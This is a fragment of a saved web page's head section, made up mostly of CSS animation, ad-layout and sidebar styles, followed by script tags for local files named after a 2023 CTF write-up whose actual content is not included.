            transform: translate3d(0, -5px, 0); }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__bounceOutUp {
  20% {
    -webkit-transform: translate3d(0, -10px, 0);
            transform: translate3d(0, -10px, 0); }
  40%,
  45% {
    opacity: 1;
    -webkit-transform: translate3d(0, 20px, 0);
            transform: translate3d(0, 20px, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
            transform: translate3d(0, -2000px, 0); } }

@keyframes Toastify__bounceOutUp {
  20% {
    -webkit-transform: translate3d(0, -10px, 0);
            transform: translate3d(0, -10px, 0); }
  40%,
  45% {
    opacity: 1;
    -webkit-transform: translate3d(0, 20px, 0);
            transform: translate3d(0, 20px, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
            transform: translate3d(0, -2000px, 0); } }

@-webkit-keyframes Toastify__bounceInDown {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  0% {
    opacity: 0;
    -webkit-transform: translate3d(0, -3000px, 0);
            transform: translate3d(0, -3000px, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, 25px, 0);
            transform: translate3d(0, 25px, 0); }
  75% {
    -webkit-transform: translate3d(0, -10px, 0);
            transform: translate3d(0, -10px, 0); }
  90% {
    -webkit-transform: translate3d(0, 5px, 0);
            transform: translate3d(0, 5px, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@keyframes Toastify__bounceInDown {
  from,
  60%,
  75%,
  90%,
  to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
            animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1); }
  0% {
    opacity: 0;
    -webkit-transform: translate3d(0, -3000px, 0);
            transform: translate3d(0, -3000px, 0); }
  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, 25px, 0);
            transform: translate3d(0, 25px, 0); }
  75% {
    -webkit-transform: translate3d(0, -10px, 0);
            transform: translate3d(0, -10px, 0); }
  90% {
    -webkit-transform: translate3d(0, 5px, 0);
            transform: translate3d(0, 5px, 0); }
  to {
    -webkit-transform: none;
            transform: none; } }

@-webkit-keyframes Toastify__bounceOutDown {
  20% {
    -webkit-transform: translate3d(0, 10px, 0);
            transform: translate3d(0, 10px, 0); }
  40%,
  45% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
            transform: translate3d(0, -20px, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
            transform: translate3d(0, 2000px, 0); } }

@keyframes Toastify__bounceOutDown {
  20% {
    -webkit-transform: translate3d(0, 10px, 0);
            transform: translate3d(0, 10px, 0); }
  40%,
  45% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
            transform: translate3d(0, -20px, 0); }
  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
            transform: translate3d(0, 2000px, 0); } }

.Toastify__bounce-enter--top-left, .Toastify__bounce-enter--bottom-left {
  -webkit-animation-name: Toastify__bounceInLeft;
          animation-name: Toastify__bounceInLeft; }

.Toastify__bounce-enter--top-right, .Toastify__bounce-enter--bottom-right {
  -webkit-animation-name: Toastify__bounceInRight;
          animation-name: Toastify__bounceInRight; }

.Toastify__bounce-enter--top-center {
  -webkit-animation-name: Toastify__bounceInDown;
          animation-name: Toastify__bounceInDown; }

.Toastify__bounce-enter--bottom-center {
  -webkit-animation-name: Toastify__bounceInUp;
          animation-name: Toastify__bounceInUp; }

.Toastify__bounce-exit--top-left, .Toastify__bounce-exit--bottom-left {
  -webkit-animation-name: Toastify__bounceOutLeft;
          animation-name: Toastify__bounceOutLeft; }

.Toastify__bounce-exit--top-right, .Toastify__bounce-exit--bottom-right {
  -webkit-animation-name: Toastify__bounceOutRight;
          animation-name: Toastify__bounceOutRight; }

.Toastify__bounce-exit--top-center {
  -webkit-animation-name: Toastify__bounceOutUp;
          animation-name: Toastify__bounceOutUp; }

.Toastify__bounce-exit--bottom-center {
  -webkit-animation-name: Toastify__bounceOutDown;
          animation-name: Toastify__bounceOutDown; }

@-webkit-keyframes Toastify__zoomIn {
  from {
    opacity: 0;
    -webkit-transform: scale3d(0.3, 0.3, 0.3);
            transform: scale3d(0.3, 0.3, 0.3); }
  50% {
    opacity: 1; } }

@keyframes Toastify__zoomIn {
  from {
    opacity: 0;
    -webkit-transform: scale3d(0.3, 0.3, 0.3);
            transform: scale3d(0.3, 0.3, 0.3); }
  50% {
    opacity: 1; } }

@-webkit-keyframes Toastify__zoomOut {
  from {
    opacity: 1; }
  50% {
    opacity: 0;
    -webkit-transform: scale3d(0.3, 0.3, 0.3);
            transform: scale3d(0.3, 0.3, 0.3); }
  to {
    opacity: 0; } }

@keyframes Toastify__zoomOut {
  from {
    opacity: 1; }
  50% {
    opacity: 0;
    -webkit-transform: scale3d(0.3, 0.3, 0.3);
            transform: scale3d(0.3, 0.3, 0.3); }
  to {
    opacity: 0; } }

.Toastify__zoom-enter {
  -webkit-animation-name: Toastify__zoomIn;
          animation-name: Toastify__zoomIn; }

.Toastify__zoom-exit {
  -webkit-animation-name: Toastify__zoomOut;
          animation-name: Toastify__zoomOut; }

@-webkit-keyframes Toastify__flipIn {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in;
    opacity: 0; }
  40% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in; }
  60% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    opacity: 1; }
  80% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -5deg); }
  to {
    -webkit-transform: perspective(400px);
            transform: perspective(400px); } }

@keyframes Toastify__flipIn {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in;
    opacity: 0; }
  40% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    -webkit-animation-timing-function: ease-in;
            animation-timing-function: ease-in; }
  60% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    opacity: 1; }
  80% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -5deg); }
  to {
    -webkit-transform: perspective(400px);
            transform: perspective(400px); } }

@-webkit-keyframes Toastify__flipOut {
  from {
    -webkit-transform: perspective(400px);
            transform: perspective(400px); }
  30% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    opacity: 1; }
  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    opacity: 0; } }

@keyframes Toastify__flipOut {
  from {
    -webkit-transform: perspective(400px);
            transform: perspective(400px); }
  30% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
            transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    opacity: 1; }
  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
            transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    opacity: 0; } }

.Toastify__flip-enter {
  -webkit-animation-name: Toastify__flipIn;
          animation-name: Toastify__flipIn; }

.Toastify__flip-exit {
  -webkit-animation-name: Toastify__flipOut;
          animation-name: Toastify__flipOut; }

@-webkit-keyframes Toastify__slideInRight {
  from {
    -webkit-transform: translate3d(110%, 0, 0);
            transform: translate3d(110%, 0, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__slideInRight {
  from {
    -webkit-transform: translate3d(110%, 0, 0);
            transform: translate3d(110%, 0, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__slideInLeft {
  from {
    -webkit-transform: translate3d(-110%, 0, 0);
            transform: translate3d(-110%, 0, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__slideInLeft {
  from {
    -webkit-transform: translate3d(-110%, 0, 0);
            transform: translate3d(-110%, 0, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__slideInUp {
  from {
    -webkit-transform: translate3d(0, 110%, 0);
            transform: translate3d(0, 110%, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__slideInUp {
  from {
    -webkit-transform: translate3d(0, 110%, 0);
            transform: translate3d(0, 110%, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__slideInDown {
  from {
    -webkit-transform: translate3d(0, -110%, 0);
            transform: translate3d(0, -110%, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@keyframes Toastify__slideInDown {
  from {
    -webkit-transform: translate3d(0, -110%, 0);
            transform: translate3d(0, -110%, 0);
    visibility: visible; }
  to {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); } }

@-webkit-keyframes Toastify__slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(110%, 0, 0);
            transform: translate3d(110%, 0, 0); } }

@keyframes Toastify__slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(110%, 0, 0);
            transform: translate3d(110%, 0, 0); } }

@-webkit-keyframes Toastify__slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(-110%, 0, 0);
            transform: translate3d(-110%, 0, 0); } }

@keyframes Toastify__slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(-110%, 0, 0);
            transform: translate3d(-110%, 0, 0); } }

@-webkit-keyframes Toastify__slideOutUp {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, 110%, 0);
            transform: translate3d(0, 110%, 0); } }

@keyframes Toastify__slideOutUp {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, 110%, 0);
            transform: translate3d(0, 110%, 0); } }

@-webkit-keyframes Toastify__slideOutDown {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, -110%, 0);
            transform: translate3d(0, -110%, 0); } }

@keyframes Toastify__slideOutDown {
  from {
    -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0); }
  to {
    visibility: hidden;
    -webkit-transform: translate3d(0, -110%, 0);
            transform: translate3d(0, -110%, 0); } }

.Toastify__slide-enter--top-left, .Toastify__slide-enter--bottom-left {
  -webkit-animation-name: Toastify__slideInLeft;
          animation-name: Toastify__slideInLeft; }

.Toastify__slide-enter--top-right, .Toastify__slide-enter--bottom-right {
  -webkit-animation-name: Toastify__slideInRight;
          animation-name: Toastify__slideInRight; }

.Toastify__slide-enter--top-center {
  -webkit-animation-name: Toastify__slideInDown;
          animation-name: Toastify__slideInDown; }

.Toastify__slide-enter--bottom-center {
  -webkit-animation-name: Toastify__slideInUp;
          animation-name: Toastify__slideInUp; }

.Toastify__slide-exit--top-left, .Toastify__slide-exit--bottom-left {
  -webkit-animation-name: Toastify__slideOutLeft;
          animation-name: Toastify__slideOutLeft; }

.Toastify__slide-exit--top-right, .Toastify__slide-exit--bottom-right {
  -webkit-animation-name: Toastify__slideOutRight;
          animation-name: Toastify__slideOutRight; }

.Toastify__slide-exit--top-center {
  -webkit-animation-name: Toastify__slideOutUp;
          animation-name: Toastify__slideOutUp; }

.Toastify__slide-exit--bottom-center {
  -webkit-animation-name: Toastify__slideOutDown;
          animation-name: Toastify__slideOutDown; }</style><style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style type="text/css" data-styled-components="jqVHLt iyLjmU" data-styled-components-is-local="true">
/* sc-component-id: sc-cmTdod */

.jqVHLt{white-space:nowrap;}
/* sc-component-id: sc-jwKygS */

.iyLjmU{display:inline-block;font-size:12px;margin-left:10px;color:white;cursor:pointer;}.iyLjmU::before{content:'✕';}</style><style type="text/css" data-styled-components="" data-styled-components-is-local="true"></style><style id="sm-ad-style-container">
  .sm-ad-wrapper {
    display: none;
  }
  .sm-ad-container {
    position: relative;
    height: 0;
    overflow: hidden;
  }
  .sm-ad-container a {
    display: block;
    width: 100%;
    height: 100%;
  }
  @keyframes fadeIn {
    from {
      opacity: 0.3;
    }
    to {
      opacity: 1;
     }
  }

  @keyframes fadeOut {
    from {
      opacity: 1;
     }
    to {
      opacity: 0;
     }
  }

  @-webkit-keyframes fadeIn {
    from {
      opacity: 0.3;
    }
    to {
      opacity: 1;
     }
  }

  @keyframes cardEaseIn {
    from {
      opacity: 0.3;
      top: 50px;
    }
    to {
      opacity: 1;
      top: 0;
     }
  }
  @-webkit-keyframes cardEaseIn {
    from {
      opacity: 0.3;
      top: 50px;
    }
    to {
      opacity: 1;
      top: 0;
     }
  }

  .sm-ad-item {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    display: block;
  }
  .sm-ad-img {
    display: block;
    max-width: 100%;
    min-width: 100%;
    height: 100%;
  }
  .ad-price {
    cursor: pointer;
    position: absolute;
    bottom: 0;
    right: 0;
    font-size: 10px;
    line-height: 1em;
    padding: 4px 12px;
    color: white;
    background-color: rgba(216, 216, 216);
    background-color: rgba(216, 216, 216, 0.3);
    border-top-left-radius: 2px;
  }
  .ad-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 999;
    padding: 3px 7px;
    background-color: rgba(216, 216, 216, 0.3);
    color: white;
    font-size: 14px;
    border-radius: 50%;
  }
  .ad-close:before {
    content: "X";
  }
  .ad-price:before {
    content: "广告";
  }
  .sm-ad-item:hover > .ad-price {
    background-color: rgba(216, 216, 216);
    background-color: rgba(216, 216, 216, 0.5);
  }
  .sm-ad-item:hover > .ad-price:before  {
    content: "升级至无广告版本";
  }
  .sm-ad-mask {
    display: none;
    background-color: rgba(44, 48, 51, 0.4);
    position: absolute;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
  }
  .sm-ad-mask button {
    width: 120px;
    height: 35px;
    border-radius: 3px;
    box-shadow: 0px 4px 30px 0px rgba(0,0,0,0.3);
    color: #ffffff;
    font-size: 15px;
    transform: translate(0%, 50%);
  }
  .sm-ad-ever-close {
    background-color: #E1AE6C;
    margin-right: 8px;
    border: none;
  }
  .sm-ad-temporal-close {
    border: 1px solid #FFF;
    background-color: rgba(0,0,0,0.1);
  }

  .sm-ad-card {
    width: 100%;
    position: relative;
    margin: 10px 0;
  }
  .sm-ad-card a {
    text-decoration: none;
  }
  .sm-ad-card .sm-ad-carousel__switcher {
    display: none;
  }
  .sm-ad-card:hover .sm-ad-carousel__switcher {
    display: block;
  }
  .sm-ad-card__close {
    width: 12px;
    height: 12px;
    transform: rotate(45deg);
    color: #cdcdcd;
    position: absolute;
    top: -5px;
    right: -5px;
    font-weight: lighter;
    cursor: pointer;
  }
  .sm-ad-card__close:before {
    content: "+";
    font-size: 20px
  }
  .sm-ad-card__image-wrapper {
    position: relative;
    height: 100%;
  }
  .sm-ad-card__image {
    display: block;
    width: 100%;
    height: 100%;
  }
  .sm-ad-card__label {
    color: white;
    width: 45px;
    height: 22px;
    text-shadow: 0 2px 6px rgba(0, 0, 0, 0.65);
    font-size: 14px;
    transform: scale(0.5);
    transform-origin: top left;
    position: absolute;
    left: 3px;
    top: 2px;
    text-align: center;
  }
  .sm-ad-card__label--dark {
    text-shadow: unset;
    background-color: black;
    transform-origin: bottom right;
    right: 0;
    bottom: 0;
    left: unset;
    top: unset;
    width: 130px;
    height: 30px;
    line-height: 30px;
    color: rgba(255, 255, 255, 0.85);
    cursor: pointer;
  }
  .sm-ad-card__label.sm-ad-card__label--bottom-right,
  .sm-ad-card__label.sm-ad-card__label--top-right {
    width: auto;
    position: absolute;
    color: #fff;
    background-color:#000;
    padding: 4px 12px;
    font-size: 14px;
    line-height: 20px;
    text-shadow: none;
    bottom: 7px;
    left: initial;
    top: initial;
    right: 10px;
    transform-origin: bottom right;
  }
  .sm-ad-card__label.sm-ad-card__label--top-right {
    bottom: initial;
    top: 10px;
    transform-origin: top right;
  }
  .sm-ad-carousel__switcher {
    width: 12px;
    height: 12px;
    position: absolute;
    top: 46%;
    cursor: pointer;
  }
  .sm-ad-carousel__switcher > svg {
    width: 100%;
    height: 100%;
    vertical-align: top;
  }
  .sm-ad-carousel__switcher-right > svg {
    transform: rotateY(180deg);
  }
  .sm-ad-carousel__switcher-left {
    left: 3px;
  }
  .sm-ad-carousel__switcher-right {
    right: 3px;
  }

  .sm-ad-text-link a {
    text-decoration: none;
  }
  .sm-ad-text-link p {
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
  }

  .sm-ad-shortcut {
    width: 217px;
    height: 30px;
    background-color: #efefef;
    left: -10px;
    cursor: pointer
  }
  .sm-ad-shortcut .sm-ad-card__label {
    width: 48px;
    height: 28px;
    line-height: 28px;
    right: unset;
    bottom: unset;
    top: -5px;
    left: -17px;
  }
  .sm-ad-shortcut p {
    padding-left: 45px;
    font-size: 13px;
    line-height: 1.5;
    color: #7f7f7f;
    padding-top: 6px;
    width: 160px;
  }
  .sm-ad-shortcut .sm-ad-card__close {
    width: 20px;
    height: 20px;
    color: #a5a5a5;
    display: none;
    top: 4px;
    right: -1px;
    font-weight: 200;
  }
  .sm-ad-shortcut:hover .sm-ad-card__close {
    display: block;
  }
  .sm-ad-shortcut .sm-ad-card__close:before {
    font-size: 24px;
  }

  .sm-ad-mobile-link {
    width: 100%;
    height: 16px;
    margin: 15px 0 20px;
  }
  .sm-ad-mobile-link .sm-ad-card__label {
    width: 60px;
    left: -30px;
    font-size: 16px;
  }
  .sm-ad-mobile-link p {
    padding-left: 40px;
    font-size: 14px;
    font-weight: 300;
    line-height: 1;
    color: #41464b;
    width: calc(100% - 40px);
    text-align: left;
  }

  .sm-ad-mobile-card {
    height: 48vw;
    margin: 15px 0;
  }

  .sm-ad-mobile-top-banner {
    transition: height 1s ease 0s;
    height: 88px;
    width: 100%;
    margin: 0;
    position: fixed;
    z-index: 999;
  }

  .sm-ad-mobile-top-banner .sm-ad-card__label--bottom-right {
    bottom: 0;
    right: 0;
    background-color: #000000;
    border: 0;
    color: white;
  }

  .sm-ad-mobile-top-banner .sm-ad-card__label--top-left {
    left: 5px;
    top: 5px;
  }

  .sm-ad-mobile-top-banner .sm-ad-card__close {
    right: 0px;
    top: 0px;
  }

  .sm-ad-mobile-card__button {
    width: 120px !important;
    height: 36px !important;
    min-width: auto;
    position: absolute;
    bottom: 16px;
    left: calc(50% - 60px);
  }

  .sm-ad-mobile-stream-a {
    text-decoration:none;
  }
  .sm-ad-mobile-pic-container .sm-ad-card__close,
  .sm-ad-mobile-mixed-container .sm-ad-card__close {
    width: 14px;
    height: 14px;
    top: 14px;
    right: 14px;
  }
  .sm-ad-mobile-pic-container .sm-ad-card__close:before,
  .sm-ad-mobile-mixed-container .sm-ad-card__close:before {
    font-size: 24px;
    line-height: 10px;
  }
  .tencent-ad.sm-ad-mobile-stream-card__label {
    bottom: 0;
    left: 0;
  }
  .sm-ad-mobile-pic-container .sm-ad-mobile-stream-card__label,
  .sm-ad-mobile-mixed-container .sm-ad-mobile-stream-card__label {
    height: 18px;
    line-height: 18px;
    padding: 0 6px;
    top: 15px;
    left: 15px;
    text-align: center;
    border-radius: 2px;
    background-color: rgba(0,0,0,0.2);
    color: white;
  }
  .sm-ad-mobile-pic-container .sm-ad-mobile-stream-card__upgrade,
  .sm-ad-mobile-mixed-container .sm-ad-mobile-stream-card__upgrade,
  .tencent-ad.sm-ad-mobile-stream-card__upgrade {
    bottom: 0;
    right: 0;
  }
  .sm-ad-mobile-mixed-container .sm-ad-mobile-stream-card__label,
  .sm-ad-mobile-mixed-container .sm-ad-mobile-stream-card__upgrade {
    z-index: 1;
  }
  .sm-ad-mobile-stream-card__label, .sm-ad-mobile-stream-card__upgrade {
    position: absolute;
    color: #41464b;
    font-size: .7em;
    padding: 10px;
    line-height: 10px;
  }
  .sm-ad-mobile-stream-card__label {
    text-align: left;
  }
  .sm-ad-mobile-stream-card__upgrade {
    padding: 3px 6px;
    margin: 6px 10px;
    border: 1px solid #41464b;
    border-radius: 2px;
  }
  .sm-ad-mobile-mixed-container {
    position: relative;
    left: 0px;
    padding: 10px 10px 30px 10px !important;
    background-color: #f8f8f8;
  }
  .sm-ad-mobile-mixed-a {
    position: relative;
    float: left;
    display: flex;
    width: 100%;
  }
  .sm-ad-mobile-mixed-image {
    position: relative;
    float: left;
    flex: none;
  }
  .sm-ad-mobile-mixed-content {
    color: #000;
    line-height: normal;
    letter-spacing: 1.6px;
    background-color: rgb(238, 238, 238);
    display: flex;
    flex-direction: column;
  }
  .sm-ad-mobile-mixed-text {
    flex: auto;
    margin: 12px 9.5px 0 14.5px;
    overflow: hidden;
    font-size: 1em;
  }
  .sm-ad-mobile-mixed-price {
    flex: auto;
    margin-left: 14px;
    letter-spacing: 1.7px;
    overflow: hidden;
    width: calc(100% - 28px);
    font-size: 1em;
    white-space: nowrap;
    text-overflow: ellipsis;
  }
  .sm-ad-mobile-mixed-brandText {
    margin-left: 5px;
    letter-spacing: 1.6px;
    color: #676b6f;
  }
  .sm-ad-mobile-mixed-button {
    margin: 0 0 10.5px 14px;
    width: fit-content;
    max-width: 300px;
    background-color: #41464b;
    color: #fff;
    text-align: center;
    overflow: hidden;
    font-size: .86em;
    padding: .3em 1.2em;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }
  .sm-ad-mobile-pic-container {
    position: relative;
    float: left;
    width: 100%;
    padding: 10px 10px 30px 10px !important;
    background-color: #f8f8f8;
  }
  .sm-ad-mobile-pic {
    width: 100%;
  }

  .sm-ad-bottom-card__wrapper {
    position: relative;
    top: -18px;
    left: -4px;
  }
  .sm-ad-bottom-card__wrapper--animation {
    animation: cardEaseIn 1s ease-in-out;
    -webkit-animation: cardEaseIn 1s ease-in-out;
  }
  .sm-ad-bottom-card {
    width: 182px;
    height: 182px;
    position: relative;
    background-size: cover;
    cursor: pointer;
  }
  .sm-ad-bottom-card p {
    font-size: 11px;
    color: white;
  }
  .sm-ad-bottom-card .sm-ad-card__close {
    top: -8px;
    right: -2px;
    color: white;
  }
  .sm-ad-bottom-card .sm-ad-card__close:before {
    font-size: 30px;
  }
  .sm-ad-bottom-card__apron {
    box-sizing: border-box;
    width: 100%;
    height: 44px;
    background-color: rgba(0, 0, 0, 0.1);
    padding: 0 15px;
    position: absolute;
    left: 0;
    bottom: 0;
  }
  .sm-ad-bottom-card__text {
    position: relative;
    display: flex;
    flex-direction: column;
    justify-content: center;
    height: 100%;
    top: -7px;
    line-height: 1.1;
  }
  .sm-ad-bottom-card__text p {
    margin: 0;
  }

  .sm-ad-banner {
    height: 50px;
    max-width: 712px;
  }
  .sm-ad-banner .sm-ad-card__close {
    color: #ccc;
    top: -7px;
  }
  .sm-ad-banner::-webkit-scrollbar {
    width: 0;
    background-color: transparent;
  }
  .sm-ad-banner__image {
    width: 712px;
    height: 50px;
    display: block;
  }

  .sm-ad-container.tencent-ad-container .sm-ad-item,
  .sm-ad-container.with-padding-background .sm-ad-item {
    padding: 10px 10px 30px;
    background: #eee;
  }

  .sm-ad-container.with-padding-background .sm-ad-item {
    box-sizing: border-box;
  }

  .sm-ad-container.with-padding-background.sm-ad-mobile-card .sm-ad-item {
    padding-bottom: 10px;
  }

  .sm-ad-mobile-link .sm-ad-card__label--bordered {
    left: 0;
    top: 0;
    width: auto;
    border: solid 1px #41464b;
    color: #41464b;
    padding: 2px 12px;
    font-size: 14px;
    line-height: 20px;
    text-shadow: none;
  }

  .ad-template {
    position: relative;
    overflow: hidden;
    border-radius: 8px;
    background-color: #eaeef1;
  }
  .ad-template__container {
    display: flex;
    justify-content: space-between;
    height: 240px;
    padding-right: 8px;
  }
  .ad-template__mainColumn {
    display: flex;
    flex-direction: column;
    justify-content: center;
    flex-shrink: 0;
    width: 368px;
    padding: 32px 40px;
  }
  .ad-template__title {
    overflow: hidden;
    font-size: 24px;
    font-weight: 600;
    line-height: 32px;
    white-space: nowrap;
    text-overflow: ellipsis;
    color: #2c3033;
  }
  .ad-template__content {
    overflow: hidden;
    max-height: 72px;
    margin-top: 16px;
    font-size: 16px;
    line-height: 24px;
    white-space: pre-line;
    color: #2c3033;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 3;
  }
  .ad-template__buttons {
    display: flex;
    margin: 16px -12px 0;
  }
  .ad-template__button {
    flex: 1;
    overflow: hidden;
    padding: 0 12px;
  }
  .ad-template__sideColumn {
    flex-shrink: 0;
    padding: 24px 40px 16px;
  }
  .ad-template__image {
    height: 200px;
  }
  .ad-template__close {
    position: absolute;
    right: 16px;
    top: 16px;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    cursor: pointer;
  }
  .ad-template__close > svg {
    display: block;
  }
  .ad-button {
    display: block;
    overflow: hidden;
    box-sizing: border-box;
    height: 40px;
    padding: 7px;
    border: 1px solid;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 500;
    line-height: 24px;
    white-space: nowrap;
    text-overflow: ellipsis;
    text-align: center;
    text-decoration: none;
  }
  .ad-button--primary {
    border-color: #4583d4;
    color: #fff;
    background-image: linear-gradient(#5ba0e7, #4583d4);
  }
  .ad-button--primary:hover {
    background-image: none;
    background-color: #5ba0e7;
  }
  .ad-button--primary:active {
    background-image: none;
    background-color: #4583d4;
  }
  .ad-button--secondary {
    border-color: rgba(65, 70, 75, 0.2);
    color: #4583d4;
    background-image: linear-gradient(#fff, #f6f6f6);
  }
  .ad-button--secondary:hover {
    background-image: none;
    background-color: #fff;
  }
  .ad-button--secondary:active {
    background-image: none;
    background-color: #f6f6f6;
  }
  </style><style type="text/css">.ql-sidebar{display:none;width:340px;max-height:100vh;position:fixed;top:0;right:0;background:#f7f7f7;margin-right:auto;border-bottom:1px solid #d9d9d9;box-shadow:0 1px 6px #ccc;transition:right .2s ease-in}.sm-sidebar{width:100%;height:100%}.sm-sidebar .sm-sidebar-title{margin:0 20px;height:48px;line-height:46px;font-size:12px;border-bottom:1px solid #ddd;position:relative}.sm-sidebar .sm-sidebar-title .title-text{display:inline-block;color:#a5a5a5}.sm-sidebar .sm-sidebar-title .icon-close{width:11px;height:11px;margin:7px;color:#888;position:absolute;line-height:12px;right:0;top:10px}.sm-sidebar .sm-sidebar-title .icon-close svg path{fill:#c6c6c6}.sm-sidebar .sm-sidebar-title .icon-close svg:hover{cursor:pointer}.sm-sidebar .sm-sidebar-title .icon-close svg:hover path{fill:#5d5d5d}.sm-sidebar .sm-sidebar-body{height:calc(100% - 48px)}</style><style id="folding-style"></style><script charset="utf-8" src="./NewStarCTF 2023 Week2 官方WriteUp_files/chunk-vendors~toc-377cb46587.js.下载"></script><link rel="stylesheet" type="text/css" href="./NewStarCTF 2023 Week2 官方WriteUp_files/toc-f9d6f63f12.css"><script charset="utf-8" src="./NewStarCTF 2023 Week2 官方WriteUp_files/chunk-toc-a4ae2c29e2.js.下载"></script><script charset="utf-8" src="./NewStarCTF 2023 Week2 官方WriteUp_files/chunk-vendors~hljs-b064a46f4c.js.下载"></script></head>
    <body class="">
